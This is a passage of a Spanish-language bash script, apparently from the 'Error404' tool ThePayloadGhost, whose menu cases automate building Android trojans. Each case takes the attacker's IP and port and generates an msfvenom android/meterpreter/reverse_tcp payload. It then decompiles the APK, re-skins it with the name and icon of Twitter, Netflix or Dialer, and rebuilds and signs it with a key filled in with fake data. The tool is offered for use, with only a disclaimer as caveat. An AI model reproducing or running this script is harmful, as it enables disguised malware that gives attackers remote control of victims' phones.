echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: K y Javic                                                V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
7)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|Twitter|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/Twitter/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: K y Javic                                                V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
8)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
clear
clear
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|Netflix|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/Netflix/
cp main_icon.jpg /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: Grupo de desarrollo ERROR404                          V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
9)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
sleep 2
clear
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|Dialer|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/Dialer/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
;;
esac
